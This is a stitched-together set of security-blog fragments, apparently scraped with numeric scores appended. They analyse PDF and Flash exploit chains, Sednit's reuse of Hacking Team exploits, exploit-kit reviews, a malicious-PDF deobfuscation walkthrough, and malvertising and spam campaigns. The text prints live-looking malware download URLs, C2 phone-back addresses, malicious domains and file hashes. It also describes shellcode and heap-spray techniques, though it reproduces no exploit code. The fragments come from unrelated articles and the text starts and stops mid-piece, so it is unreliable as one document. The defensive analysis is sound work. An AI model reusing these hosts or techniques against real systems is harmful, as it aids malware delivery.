The shellcode itself is stored in the code in UCS2 form, a commonly reused URLDownloadToFile->WinExec code, having been observed in completely unrelated PDF-based attacks in the past. The URL itself is not stored inside this code, but outside in the PDF file, in the Keywords field. It is encoded using a simple replacement cipher, with the keytable being stored in the Author field.
In some of the samples the URL was also stored in the Title or Author files, and the keytable in the eD field, but that can be overcome without even having to analyse the code thanks to the peculiarities of the fields (the keytable contains all alphanumeric characters and only once; the URL contains the recurring ‘t’ and ‘:’ characters in the beginning – both are easily spottable).
Both fields are scattered with spaces to make them look less suspicious. This approach makes it possible to quickly change the URL without having to recompile the entire PDF file. Ironically, in the observed cases quite the opposite happened: the PDF was recompiled (with the shellcode-creating script recompiled using new junk instructions), and the URL itself remained essentially unchanged. The URL observed in the majority of PDFs was http://lib.willyselectronics.com:8080/welcome.php?id=6&pid=1&masha=590227589 with the value of masha being changed across the samples. Additionally, the PDF reader is also appended to the end in the form &? reader_version=%version%.
Uncharacteristically, the code contains debug messages if the Producer field of the PDF file begins with the text ‘debug’. Then, the major operational acts of the code and values of constants like the decoded URL are logged using app.alert.",0.015469273363831193
"Stage 4b: HTML
The twin part of the PDF attack is a piece of HTML employing the CVE-2010-0886 exploit in very much the same (not even obfuscated) form as the original proof-of-concept code. It contains the URL in base64-encoded hex representations. In most cases this URL was http://lib.willyselectronics.com:8080/welcome.php?id=11&pid=10&1=1, but there were occurrences where the URL pointed back to the intermediate malware-serving site, in the same form: http://gogoop.casanovarevealed.com:8080/welcome.php?id=11&pid=1&1=1&5d.",0.007416210369293186
"Where do you want to go today?
The final spam and Bredolab landing sites all had relatively long lifespans in the attack (ranging from days to weeks), and the intermediate sites didn’t last longer than a day.
Figure 3. Spam dropsites.
On checking the registration information for the utilized domains it all started to become clear. Following the old rule (‘cui prodest?’), the gain of this attack was the distribution of the spam landing site. As this site points to web pages registered in China, registered by Chinese email addresses (except for one notable exception), we can conclude that the attack must originate from China. Case closed.
However, there are more elements to this picture. Looking at the intermediate and final malware distribution sites, a totally different picture can be observed.
Figure 4. Intermediate malware dropsites.
Figure 5. Final Bredolab landing sites.
Most of the identified sites are subdomains of a domain registered via godaddy.com – these sites were probably compromised. Meanwhile, another group of sites were registered in Russia only a few days prior to their use in the attack. The email addresses used for registration appeared only to have been used for this purpose – no legitimate traffic was found relating to these addresses. One of the registrars of this domain, NAUNET-REG-RIPN, is a well-known spam- and malware-friendly provider – the preferred home for Russian cybercriminals [4]. DNRegistrar.ru is also frequently reported in connection with spam and malware.
A couple of these sites were registered in the same way as the intermediate distribution sites, but it is interesting to note that the majority seem to be using hacked legitimate websites, most of which are from godaddy.com, which has been the target in numerous cases of stolen accounts.
To summarize, the spam landing sites were registered in China only for use in the campaign; the intermediate sites are short-lived (often fast-flux) domains registered in Russia; and the final Bredolab landing sites are pretty much the same, except that these sites have a somewhat longer lifespan.
It is interesting to see a totally different approach to the different layers of the distribution. It does not make much sense to overcomplicate it so my only guess is that the different layers were outsourced/rented: the spam landing site was borrowed from a spam distribution group, and the group behind this attack was only responsible for the seeded email messages, the intermediate layers and the final Bredolab landing page. It may be a far-fetched conclusion, but it fits in the domain usage scheme. What also somewhat supports this hypothesis is the fact that the spam messages were written in good English, while the comments in the malware code were not.
The timeline of the intermediate distribution of the sites is rather interesting. In outline, the attack used hacked godaddy.com sites in the beginning and then switched to Russian sites (registered in a hurry, a couple of days beforehand) – a strange change of approach right in the middle of the events. Even more interesting is the story of the first couple of days, where Russian sites were used, along with a distribution method that has not been seen since. Moreover, the spam landing site was the one used a couple of transitions later and not in the beginning. Peculiar.",0.02008285849944491
"Bibliography
[1] Danchev, D. Spamvertised Amazon ‘Verify Your Email’, ‘Your Amazon Order’ Malicious Emails. Dancho Danchev’s Blog – Mind Streams of Information Security Knowledge. http://ddanchev.blogspot.com/2010/07/spamvertised-amazon-verify-you-email.html.
[2] The Cash Factory. Securelist. http://www.securelist.com/en/analysis/204792083/The_Cash_Factory.
[3] Kadiev, A. Web server-based malware - the Pegel case. Security Analyst Summit 2010.
[4] cashweed.ru. McAfee SiteAdvisor. http://www.siteadvisor.com/sites/cashweed.ru.
",0.013739898737897938
"Sednit APT Group Meets Hacking Team
The infamous Sednit espionage group is currently using the Hacking Team exploits disclosed earlier this week to target eastern European institutions.",0.019286847800046747
ESET Research,0.009387999064506491
10 Jul 2015 - 01:52PM,0.01152761486928533
The infamous Sednit espionage group is currently using the Hacking Team exploits disclosed earlier this week to target eastern European institutions.,0.01746451844339625
The infamous Sednit espionage group is currently using the Hacking Team exploits disclosed earlier this week to target eastern European institutions.,0.01746451844339625
"More than 400GB of internal data from the company Hacking Team were released on the Internet last weekend. According to its website, Hacking Team develops and sells ”easy-to-use offensive technology to the worldwide law enforcement and intelligence communities”. The leaked data contain a variety of information, from business proposals to the source code of the software sold by the company.",0.012177498286693567
"In particular, there are two particularly interesting development projects in the leaked data:",0.019357100002866945
"A Flash exploit targeting the vulnerability labeled CVE-2015-5119. This vulnerability was patched on Wednesday the 8th of July in Adobe security bulletin APSB15-16, and the exploit was therefore a zero-day up till then. It allows an attacker to execute arbitrary code remotely, if the attacker can convince the potential victim to open a specially crafted Flash file. Strikingly, the exploit works against all major browsers and can also be deployed easily in Microsoft Office documents (Word, Excel, PowerPoint).Hacking Team’s leaked data contain various tools for easy manipulation of the Flash exploit, and therefore it does not come as a surprise that various exploit kits integrated it very rapidly, as reported by the security researcher Kafeine. A Metasploit module is also now available.",0.011675888580693794
"A Windows local privilege escalation exploit, which is still unpatched and to which no CVE number has yet been allocated. This exploit allows an attacker to execute a program with maximum privileges.",0.00879916436668049
"Hence, the Hacking Team leak provides a complete exploitation chain, starting from a Flash exploit for the compromise, to a Windows escalation privilege exploit allowing the payload execution with elevated privileges.",0.010859037378900038
"This week ESET spotted a malicious team that rushed to integrate Hacking Team exploits into its arsenal: the Sednit group. This group, also known as APT28 or Fancy Bear, has been targeting various institutions since 2006 for espionage purposes. To do so, they develop their own software, including such tools as specialized spying software and exploit kits.",0.014182611718976723
On Wednesday the 8th of July 2015 the Sednit group started to use the Hacking Team Flash exploit in their exploit kit. Targets were then exposed to the following exploitation chain (see our blog post for more details on the exploit kit):,0.007860452128541362
"The target receives a spear-phishing email containing an URL pointing to a domain name mimicking a legitimate domain name. In this particular case, we observed the domain “osce-press.org” being used, which mimics “osce.org/press”.",0.013122138987401777
"If the target opens the URL, the browser hits a landing page with JavaScript code, which collects detailed information on the computer.",0.013858620829464874
"If the computer matches certain criteria set by the Sednit operators (language, timezone…), the server then serves an exploit to the target. Since Wednesday, a Flash exploit is delivered under the name “flash_video_x86.swf”. The decompiled code of the exploit is almost the same as the Hacking Team exploit – more precisely, the version dubbed “scratch_ie_ff_bytearray” in the leaked data.The only difference between the two exploits appears to be that the Sednit version receives the shellcode to execute in an input parameter in a manner similar to Metasploit exploits, whereas in the Hacking Team version the shellcode is hardcoded in the Flash file. The following Figures show the Main function in the two cases.",0.012741399544690113
Figure 1 – Hacking Team Flash exploit main function,0.007647340560647642
Figure 2 – Sednit Flash exploit main function,0.007705566649206963
"If the Flash exploitation works, the victim receives a first-stage backdoor – malware whose purpose is to make sure the victim is the intended target. This malware contains Hacking Team’s Windows escalation privilege exploit. Given the presence of syntactic differences, it appears the Sednit group recompiled the source code of the exploit, but without modifying its logic.",0.00946764391181798
"If the privilege escalation exploit works, the malware then sets its persistence on the machine through a scheduled task running with the highest privileges.",0.016184241134026278
This story shows that advanced groups of attackers also employ opportunistic strategies. It took only a few days for the Sednit group to re-use the Hacking Team exploitation chain for their own purpose. The Webky group – another APT team – was also reported to have done the same this week. We strongly encourage users to upgrade their Flash software.,0.011974935180459445
Indicators of Compromise,0.0076996116119932845
"Indicator
Value",0.010413202142081524
"Exploit kit domain name
osce-press.org",0.007785248787167021
"Sednit Flash exploit SHA1
D43FD6579AB8B9C40524CC8E4B7BD05BE6674F6C",0.007847554999626416
"Sednit first-stage backdoor SHA1
51B0E3CD6360D50424BF776B3CD673DD45FD0F97",0.00860049803660301
"Payload persistence script name
fvecer.bat",0.007920951466668158
"Payload file name
api-ms-win-downlevel-profile-l1-1-0.dll",0.008238732223375678
"Payload SHA1
B8B3F53CA2CD64BD101CB59C6553F6289A72D9BB
",0.010425223236680492
"Exploit kits: winter 2019 review
Active malvertising campaigns in December and the new year have kept exploit kit activity from hibernating in winter 2019. We mostly observed Fallout and RIG with the occasional, limited GrandSoft appearance for wider geo-targeting.
In addition, narrowly-focused exploit kits such as Magnitude, Underminer, and GreenFlash Sundown stayed on the same track: delivering ransomware to mostly Asian countries, and South Korea in particular.
Winter 2019 overview",0.017825434487810154
"Fallout EK
RIG EK
GrandSoft EK
Magnitude EK
Underminer EK
GreenFlash Sundown EK",0.01448309927333069
"Internet Explorer’s CVE-2018-8174 and Flash’s CVE-2018-4878 continue to be the most common vulnerabilities across the board, even though a couple exploit kits have now integrated the newer Flash CVE-2018-15982.
Fallout EK
Fallout keeps bringing fresh air into an otherwise stale atmosphere by introducing new features and even adopting newer vulnerabilities. It also appears to be a good experimental framework for some actors who have customized the payload delivery. Fallout was the second exploit kit to add CVE-2018-15982, a more recent vulnerability for the Flash Player.",0.01375814105469686
"RIG EK
Good old RIG is still kicking around, but has taken a back seat to the newer Fallout in many of the malvertising chains we track, except perhaps for Fobos. There haven’t been any notable changes to report since we last reviewed it.",0.014895188911289159
"GrandSoft EK
GrandSoft and its Ramnit payload still go hand-in-hand via limited distribution tied to compromised websites. It is perhaps one of the least sophisticated exploit kits on the market right now.",0.010715646448518079
"Magnitude EK
Meanwhile, Magnitude EK is active and served up via malvertising chains, with a focus on some APAC countries like South Korea. Magnitude continues to deliver its fileless Magniber ransomware payload.",0.020861450970088624
"Underminer EK
Underminer’s over-the-top encryption schemes to hide its exploits are keeping us researchers honest when trying to identify exactly what is under the hood. It’s worth noting that only a few days after the Flash zero-day and Proof of Concept (PoC) had been published (CVE-2018-15982), Underminer was already implementing it.",0.01115981125706611
"GreenFlash Sundown EK
Also a geo-specific exploit kit, GreenFlash Sundown has been delivering various breeds of ransomware to targets in Asia. In our latest capture, we saw it drop the Seon ransomware on South Korean users.",0.013373032186070888
"Mitigation
While timely patching and avoidance of Internet Explorer as a web browser would offer protection against the above-mentioned exploit kits, the reality is that many users (especially in corporate environments) are still trailing behind. In addition, while IE is being phased out in North America, it’s still highly adopted in Asian countries—which explains why they are currently being targeted.
Malwarebytes’ anti-exploit technology blocks each of these exploit kits—Fallout, RIG, GrandSoft, Magnitude, Underminer, and GreenFlash Sundown—before they even have a chance to drop their payload.",0.014036641803803374
"As we move further into 2019, we can say that exploit kits, while nowhere near their peak activity in 2017, are still hanging on, being used primarily in malvertising distribution campaigns. In terms of global activity, Fallout is leading the charge, providing the most diverse campaigns and payloads. Meanwhile, the Asia-specific EKs are for the most part continuing on with their usual pattern of driving innovation (to a degree) and distributing ransomware.
",0.013501045801084577
"“The Word bug that just won’t die”:  CVE-2012-0158, the cybercrime gift that keeps on taking…",0.009850441089123696
"Written by
Editor",0.007990427730288352
"July 01, 2016",0.00879183798487082
Products & Services Threat Research CVE-2012-0158 Microsoft Office SophosLabs vulnerability,0.007557301677611483
"Arguably one of the most exploited Microsoft Office vulnerabilities of the last decade, CVE-2012-0158’s longevity is one of constant adaptation. Ever since its disclosure in 2012, this vulnerability has been the attack vector of choice for exploitation by attackers who seek to hijack Microsoft Word or Excel and force these programs to execute malicious code.
In fact, according to SophosLabs research, as late as Q4 2015, CVE-2012-0158 was still used by 48% of exploits specifically targeting Office documents.
In this new research paper, Graham Chantry of SophosLabs provides a deep dive into several exploits found in the wild and how they work using CVE-2012-0158.",0.011610340254972873
"This paper also investigates why this vulnerability has been so persistent and popular for the past four years, and theorizes about its possible longevity. The good news for most of us is that the number of computers still vulnerable to this attack is dwindling worldwide, especially as Office releases new updates, and more computers are patched and upgraded to defend against this specific vulnerability.
Our researchers dissect all aspects of this vulnerability in this new research paper: how it works, why it’s been so popular, how it’s changed form, who it’s most commonly utilized against and what the future holds for it.
You can download the paper, as well as all our other SophosLabs research, on our technical papers page.",0.011503178121324842
"About SophosLabs
SophosLabs is the global network of threat centers staffed by Sophos researchers and analysts.
You can find our industry-leading research and technical papers, expert opinion, and security advice at Naked Security and right here on the Sophos Blog.
Sign up for our Sophos Blog newsletter, follow us on your favorite social media networks, chat with us in our forums, download our informative podcasts, or sign up for our RSS feeds.",0.031685910172434606
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
The Malware Archives: PDF Files,0.010843293641805252
"Chances are you’ve probably used Adobe Reader before to read Portable Document Format (PDF) files. Adobe Reader—formerly Acrobat Reader—remains the number one program used to handle PDF files, despite competition from others.
However, Adobe Reader has a history of vulnerabilities and gets exploited quite a bit. Once exploitation succeeds, a malware payload can infect a PC using elevated privileges.
For these reasons, it’s good to know how to analyze PDF files, but analysts first need a basic understanding of a PDF before they deem it malicious: here is the information you’ll need to know.
A PDF file is essentially just a header, some objects in-between, and then a trailer. Some PDF files don’t have a header or trailer, but that is rare. The objects can either be direct or indirect, and there are eight different types of objects.",0.013268000077381603
"Direct objects are inline values in the PDF (/FlatDecode, /Length, etc) while indirect objects have a unique ID and generation number (obj 20 0, obj 7 0, etc). Indirect objects are usually what we’re paying attention to when analyzing PDF malware, and can be referenced by other objects in a PDF file.
Knowing that, let’s look at some PDF malware. We’re going to observe a PDF that exploits CVE-2010-0188, a very common exploit found in the wild. For reference purposes, the md5 hash of our target file is 9ba98b495d186a4452108446c7faa1ac.
The first thing we need is analysis tools.
I find the PDF tools by Didier Stevens to be some of the best out there. Stevens’ tools are all written in Python and are very well documented. For this particular malware, we’ll be using Stevens’ tools along with some other tools used to de-obfuscate and debug code.
PDFiD is the first tool we will use, and is a very simple script that searches for suspicious keywords. Here is the output from the scan of our target file.",0.01678566892715838
"The output from PDFiD reports there are nine objects. From those objects there are two streams, along with an AcroForm object. Let’s observe the AcroForm object first. For this, we’re going to use a different tool by Stevens called pdf-parser, which will take a closer look at specific PDF objects.",0.01425100612032959
"The AcroForm object references object 21 below. From object 21, we see the text “XFA”, which stands for XML Forms Architecture, an Adobe format used for PDF forms. Next to XFA we see two objects referenced: obj 100 and 8. Since there is no obj 100, we’ll take a look at obj 8 instead.",0.010799040480833355
"There are two objects available with different generation numbers: obj 8 0 and the other 8 2. The generation number simply represents the version number of the object and increments whenever there are multiple instances of one object ID. However, obj 21 references obj 8 0, so let’s stay focused on the first one.
Here is where things start to get interesting. Inside 8 0 we see there is a stream that appears to be zero-length (/Length 0). Streams are basically large sets of data. With a malicious PDF, that usually means JavaScript exploit code is inside, which will likely lead to the execution of shellcode.
Now that we have our eyes on 8 0, we should investigate it further using pdf-parser. We’re going to look specifically at the raw output of 8 0 using the following command (the output was quite long, so I sent it to a text file):
python pdf-parser.py -f -o 8 -w pdf_malware.pdf > object8.txt
And now we’ll look at the output, which appears to contain some JavaScript. Inside the script you’ll see a very long sequence of characters. It would seem the length of the data stream is not 0 as originally led to believe.",0.013306831158099608
"These values are numeric character references (NCRs). In HTML, character references to &#31; are not allowed, except for 9, 10, and 13. These are control characters that do not represent a printable value.
In order for us to understand what these character references represent, we need to consult the ASCII table. However, due to the sheer amount of character references we have, it would take some time to convert these manually. We will either need a script or some special tool to perform rapid conversions. Thanks to Kahu Security, we have such a tool called the Converter.
Converter is a simple program used to take data and convert to/from many types, and also permits bitwise operations. For this PDF malware we can copy the NCRs into Converter and select ‘Decode HTML’.",0.017627048697187897
Success! The output box reveals decoded JavaScript.,0.014665579460187428
"Now we can paste this JavaScript into a new text file and clean it up. However, there seems to be a problem once we paste the code.",0.010988224955910009
"It looks like every value in the “ar” array is printed on a separate line. With almost 4,000 lines in the new document, this would take too long to fix by hand.
The reason for this is that NCR 10 represents a line feed (LF), and is placed after every comma in the array. If you looked at the image of the decoded output, it actually shows up as a little black bar, almost resembling a pipe or sheffer stroke character (“|”).
In order to fix this we only need to do a Find/Replace and remove all occurrences of NCR 10. Afterward, we just repeat the conversion process using Converter, and place the decoded output into a new text file, this time wrapped in <script> tags.",0.01399972103293623
"That looks much better. Now at only 22 lines, we can analyze the code further with ease.
However, when reading the code, it appears there is still some work to do. It would seem the JavaScript is still slightly obfuscated. From here it might be a good idea to debug the code to quickly understand what’s going on.
To do that, I’m going to use Firebug, an Add-on for Mozilla Firefox. Firebug is a multipurpose tool for analyzing web pages and also allows for inspecting and debugging of JavaScript. There are other JavaScript debuggers available, but I like this one.
After adding some <html> tags, we can load this file into Firefox and start debugging. I went ahead and set a breakpoint on the last line and executed the code. From the picture below, it can be seen that “w” decodes to “eval()”, a JavaScript command commonly used in malware to execute code, while “s” is the de-obfuscated code itself.",0.014836359809654143
"At this point we can copy the code from “s” and paste it into another text file. After cleaning up the code and adding some comments, it appears we have arrived at our final destination.",0.010336440986145057
"A quick glance over the code reveals a heap spray followed by a NOP sled. Afterward successful exploitation, the embedded shellcode will execute.",0.015274093854814264
"When examining the shellcode in a Hex Editor, we can see the website contacted by the malware, which is hxxp://[edited]/w.php?f=0&e=4. If you look closely, it also appears the downloaded malware will be registered as a DLL on the host as wpbt.dll (slightly obfuscated with some junk bytes).",0.013668949261350205
"And that’s all there is to it. We don’t really need to analyze the file any further, as we can already understand what’s going to happen when the PDF file is executed.
The good news is this will not affect users who update Adobe Reader regularly, as the exploit only targets users with version 8 and 9. In addition, a lot of web browsers like Google Chrome have integrated their own PDF viewers to prevent users from exploitation.
To stay safe using Adobe Reader, ensure you have automatic updates enabled, only view PDFs from trusted sources, and consider alternate viewers. Adobe PDF exploits can provide attackers with a foothold in your PC that can easily lead to malware infections, so you may also want to consider dropping it from your PC altogether if you don’t require it.
Stay tuned for more analysis on malicious documents and other media.
_______________________________________________________________________________
Joshua Cannell is a Malware Intelligence Analyst at Malwarebytes where he performs research and in-depth analysis on current malware threats. He has over 5 years of experience working with US defense intelligence agencies where he analyzed malware and developed defense strategies through reverse engineering techniques. His articles on the Unpacked blog feature the latest news in malware as well as full-length technical analysis.  Follow him on Twitter @joshcannell
",0.016266689690469516
PRODUCTS & SERVICES,0.010734820384793453
SophosLabs researchers speaking at Virus Bulletin conference,0.013146482921403413
Talks will explore threats to the Windows and Android operating systems,0.00865416669388619
"Written by
Bill Brenner",0.008906235048519173
"September 29, 2017",0.009425603981019437
Malware Products & Services Threat Research Android SophosLabs Virus Bulletin Webview Windows Intruder,0.011135314607339852
"Next week is the Virus Bulletin conference in Madrid, and two of our own will be giving talks.
Gabor “Szapi” Szappanos, a researcher in our Budapest lab, will present “When worlds collide – the story of Office exploit builders” Friday at 10 a.m. local time in the Green Room at Novotel Madrid Center hotel.
Szapi has focused a lot on the topic. Examples of his research include a paper on exploits targeting the CVE-2017-0199 vulnerability, the AKBuilder kit, and Operation Pony Express.
He describes his talk this way on the Virus Bulletin conference website:
The APT and cybercrime worlds traditionally use different tools and distribute different malware families. The information flow is usually strictly one directional: the cybercrime groups snatch ideas and exploits from the APT groups. But there have been a handful of cases when the direction was just the opposite, and the presentation will cover the more interesting ones.
Specifically, he’ll spend time talking about Microsoft Word Intruder, Ancalog and AKBuilder.
Rowland Yu, a researcher in our Sydney lab who specializes in analysis of Android malware, will present “Webview is far more than a ‘view‘”.  He describes his talk this way on the website:
Android’s Webview, as described by Google, is a view that enables Android apps to display web content. Today, it is far more than a just ‘view’: using a Webview allows developers to utilize advanced web technologies such as CSS, iframe and JavaScript to build apps. In this way, Webview not only changes the landscape of the web but also weakens the web’s security infrastructure.
By exploiting Webview with a dynamic URL, he says, malicious apps can bypass the Google Bouncer scanner as well as the AV detection. It also lets attackers load different pages without having to update the apps. Injected JavaScript code in a Webview allows malicious apps to steal sensitive and confidential information and control apps without users interaction.
He’ll give several examples of the problem, and ways we can better defend ourselves from the threat.
His talk will be in the Green Room Thursday, 9 a.m. local time.",0.01714544242061744
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Malvertising Hits DailyMotion, Serves Up Angler EK
We have been tracking an attack via .eu sites for several days but were missing the final payload. However, this changed when we managed to reproduce a live infection via an ad call coming from popular video streaming site DailyMotion, ranked among Alexa’s top 100 sites.
This malversiting incident happened via real-time bidding (RTB) within the WWWPromoter marketplace. A decoy ad (pictured below) from a rogue advertiser initiates a series of redirections to .eu sites and ultimately loads the Angler exploit kit.
The bogus advertiser is using a combination of SSL encryption, IP blacklisting and JavaScript obfuscation and only displays the malicious payload once per (genuine) victim. In addition, Angler EK also fingerprints potential victims before launching its exploits to ensure the user is not a security researcher, honeypot or web crawler.",0.011862868188656672
"We immediately contacted Atomx, the online media exchange platform used in the ad call, who informed us the issue was coming from WWPromoter and more specifically a malicious buyer (the rogue advertiser) on their network.
The incident was resolved very rapidly once the proper contacts were made and the problem isolated. For this, we would like to them all parties involved in taking such prompt action, therefore limiting the potential damage to innocent users.
This particular malvertising attack is one of a few campaigns we have been tracking which is much more sophisticated than the average incidents we encounter daily. We can say that lately threat actors have really stepped up their game in terms of being very stealthy and making a particular ad call look benign when reproduced in a lab environment.
Indeed, the problem comes when we suspect foul play but can’t prove it with a live infection. It is difficult to convince ad networks to take action, when on the surface there’s nothing wrong with a particular advertiser.
This is also a reminder that even popular sites with recognized brand names can still be used as a vector to distribute malware.
Malwarebytes Anti-Exploit users were protected against this attack (Flash CVE-2015-7645) which would have dropped Bedep and ad fraud, but possibly other payloads as well.
Technical details
Infection flow",0.013069985280629415
"Publisher: dailymotion.com/video/xv1pn7_the-x-factor-uk-s09e22-live-shows-10-11-2012-part-1_shortfilms
Ad call: p.ato.mx/placement?v=8&id=9146&size=728×90&type=iframe&b=0&domain=&screen=1600x900x24
&timezone=300&cookies=1&flash=1&r=http%3A%2F%2Fwww.dailymotion.com
%2Fvideo%2Fxv1pn7_the-x-factor-uk-s09e22-live-shows-10-11-2012-part-1_shortfilms
Malvertising: creative.wwwpromoter.com/pop-imp/1491/11672
Fake advertiser (loads advert picture and JS): {sanitized}.eu/advertising.html
Fake advertiser (booby trapped JS): {sanitized}.eu/scripts/media.js?
Fake advertiser: {sanitized}.eu/advertising.html?tm=1449123577264
Redirector (SSL) to Angler EK: worldbesttraffic.eu/
Angler EK: ftuifio.vpkoqbs.eu/civis/viewforum.php?f=3s5&sid=vk830.1892qo288&",0.013762608675543464
Fiddler view,0.009297219812194335
"If you would like more information about this attack, feel free to contact us via the usual means.
",0.01993848023585476
"Week in security (February 26 – March 4)
Last week on Malwarebytes Labs, we explained how to protect your computer from malicious cryptomining, we gave an encryption 101 lesson using ShiOne ransomware as a case study, and we offered an explanation about SQL injection. We also released a report on the state of malicious cryptomining from its first resurgence in the fall until now.
In active malware, we discussed how the RIG malvertising campaign uses cryptocurrency themes as a decoy, how an old virus made its way onto a Chinese DDoS bot, and how a massive DDoS attack washed over GitHub.
We also drew your attention to our own Chris Boyd appearing in Jenny Radcliffe’s Human Factor Podcast.
Other news",0.011817525789947214
"Does your endpoint solution stop fileless attacks? They are gaining traction, says a Ponemon Institute study. (Source: Bricata)
Feedless is an iOS content blocker that takes the media out of social media. (Source: The Verge)
A serious remote code execution vulnerability in both the ‘μTorrent desktop app for Windows and the newly launched ‘μTorrent Web’ was reported. (Source: The Hacker News)
But apparently, the Torrent vulnerabilities have already been fixed. (Source: The BitTorrent Engineering Blog)
An ad network used an advanced malware technique to conceal CPU-draining mining ads. (Source: Ars Technica)
US Supreme Court wrestles with Microsoft data privacy fight. (Source: Reuters)
Loapi cryptocurrency mining malware is so powerful it can melt your phone. (Source: Newsweek)
German government Intranet under ongoing attack. (Source: TheGuardian)
Trustico states they stored private keys for customers’ SSL certificates. (Source: Bleeping Computer)
Flash exploit CVE-2018-4878 was spotted in the wild as part of massive malspam campaign. (Source: Morphisec)
Equifax says hackers stole more than previously reported. (Source: CBS Philly)
Virus downs hundreds of Tim Hortons cash registers; furious owners threaten lawsuit. (Source: CTV News)
SgxSpectre attack can extract data from Intel SGX enclaves. (Source: Bleeping Computer)",0.011438865289908007
"Stay safe, everyone!
",0.011913018809127096
"Cybercriminals are currently attempting to trick hundreds of thousands of users into clicking on the malicious links found in the currently spamvertised bogus ‘Sendspace File Delivery Notifications‘.
Upon clicking on any of the links found in the email, users are exposed to the client-side exploits served by the latest version of the Black Hole Exploit Kit.
More details:",0.014659176925309048
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample spamvertised malicious URls: hxxp://mininet.nl/forwarding.htm; hxxp://hd-group.cn/redirect.htm; hxxp://cztiyu.com/upload.htm
Sample client-side exploits serving URL: hxxp://canadianpanakota.ru:8080/forum/links/column.php; hxxp://anifkailood.ru:8080/forum/links/column.php; hxxp://pelamutrika.ru:8080/forum/links/public_version.php
Sample malicious payloa dropping URL: hxxp://canadianpanakota.ru:8080/forum/links/column.php?
bwi=1i:2w:1h:1n:1l&oaera=3l&zmbxivwt=2v:1k:1m:32:33:1k:1k:31:1j:1o&evgiw=1n:1d:1g:1d:1h:1d:1f
Sample client-side exploits served: CVE-2010-0188
Upon successful client-side exploitation, the campaign drops MD5: 532bdd2565cae7b84cb26e4cf02f42a0 – detected by 33 out of 44 antivirus scanners as Worm:Win32/Cridex.E
Once executed it creates %AppData%kb00121600.exe on the affected system.
The sample also creates the following registry entries:
HKEY_CURRENT_USERSoftwareMicrosoftWindows NTCFBDC89D4
HKEY_CURRENT_USERSoftwareMicrosoftWindows NTS25BC2D7B
As well as the following Mutexes:
LocalXMM00000418
LocalXMI00000418
LocalXMRFB119394
LocalXMM000005E4
LocalXMI000005E4
LocalXMM0000009C
LocalXMI0000009C
LocalXMM000000C8
LocalXMI000000C8
It then phones back to hxxp://210.253.102.95:8080/DPNilBA/ue1elBAAAA/tlSHAAAAA/ and to hxxp://123.49.61.59:8080/AJtw/UCyqrDAA/Ud+asDAA/
We’ve already seen the same pseudo-randomly generated C&C characters used in the first ‘phone back request’ (DPNilBA/ue1elBAAAA/tlSHAAAAA/) used in the following previously profiled malicious campaigns:",0.011971311403933704
"Cybercriminals resume spamvertising ‘Payroll Account Cancelled by Intuit’ themed emails, serve client-side exploits and malware
Cybercriminals spamvertise millions of FDIC ‘Your activity is discontinued’ themed emails, serve client-side exploits and malware",0.01315999331421347
"Not surprisingly, we’ve also seen the second ‘phone back’ IP (123.49.61.59) used in the following campaigns:",0.018360754932821965
Spamvertised ‘Your UPS delivery tracking’ emails serving client-side exploits and malware,0.009985584589650376
As well as the actual pseudo-randomly generated characters used in the second C&C (AJtw/UCyqrDAA/Ud+asDAA/) in the following analyses:,0.01295316359247467
"Multiple ‘Inter-company’ invoice themed campaigns serve malware and client-side exploits
‘Your Discover Card Services Blockaded’ themed emails serve client-side exploits and malware",0.010226607878325633
"Malicious domain names reconnaissance:
canadianpanakota.ru – 120.138.20.54; 203.80.16.81; 202.180.221.186
Name server: ns1.canadianpanakota.ru – 62.76.178.233
Name server: ns2.canadianpanakota.ru – 132.248.49.112
Name server: ns3.canadianpanakota.ru – 84.22.100.108
Name server: ns4.canadianpanakota.ru – 65.99.223.24
The following malicious domains also respond to the same IP:
forumibiza.ru
donkihotik.ru
lemonadiom.ru
peneloipin.ru
finitolaco.ru
moneymakergrow.ru
fionadix.ru
pelamutrika.ru – 202.180.221.186
Name server: ns1.pelamutrika.ru – 62.76.189.72
Name server: ns2.pelamutrika.ru – 41.168.5.140
Name server: ns3.pelamutrika.ru – 132.248.49.112
Name server: ns4.pelamutrika.ru – 209.51.221.247
Name server: ns5.pelamutrika.ru – 208.87.243.196
Name server: ns6.pelamutrika.ru – 216.99.149.226
The following malicious domains also respond to the same IP:
ganiopatia.ru – 202.180.221.186
pelamutrika.ru – 202.180.221.186
ganalionomka.ru – 202.180.221.186
genevaonline.ru – 202.180.221.186
francese.ru – 202.180.221.186
podarunoki.ru – 202.180.221.186
publicatorian.ru – 202.180.221.186
cinemaallon.ru – 202.180.221.186
pitoniamason.ru – 202.180.221.186
leberiasun.ru – 202.180.221.186
dimarikanko.ru – 202.180.221.186
somaliaonfloor.ru – 202.180.221.186
panamechkis.ru – 202.180.221.186
anifkailood.ru – 202.180.221.186; 212.162.52.180; 212.162.56.210
Name server: ns1.anifkailood.ru – 62.76.189.72
Name server: ns2.anifkailood.ru – 62.76.177.104
Name server: ns3.anifkailood.ru – 41.168.5.140
Name server: ns4.anifkailood.ru – 209.51.221.247
Name server: ns5.anifkailood.ru – 42.121.116.38
Name server: ns6.anifkailood.ru – 110.164.58.250
The following malicious domains also respond to the same IP:
ganiopatia.ru – 202.180.221.186
pelamutrika.ru – 202.180.221.186
ganalionomka.ru – 202.180.221.186
anifkailood.ru – 202.180.221.186
genevaonline.ru – 202.180.221.186
francese.ru – 202.180.221.186
podarunoki.ru – 202.180.221.186
publicatorian.ru – 202.180.221.186
cinemaallon.ru – 202.180.221.186
pitoniamason.ru – 202.180.221.186
leberiasun.ru – 202.180.221.186
dimarikanko.ru – 202.180.221.186
somaliaonfloor.ru – 202.180.221.186
panamechkis.ru – 202.180.221.186
We’ve also seen some of these malicious domains used in previously profiled campaigns, indicating that the cybercriminal/gang of cybercriminals behind these attacks are continuing to rotate the impersonated brands and launch new social engineering driven campaigns in the wild.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.021649531751257278
"By Mike Johnson
Several weeks back, I was presented with a group of snapshots from an active BlackHole Exploit Kit 1.2 Control Panel.
As with other toolkits I’ve seen in the wild, this one has all the makings of some real bad medicine. The authors have yet again gone to the trouble of making this toolkit incredibly easy to use and widely available for a price. Just a little unsavory web hosting in a country with few or no diplomatic relations and off to the races they go.
It appears this toolkit is configurable in both Russian and English, making one wonder its true origins.
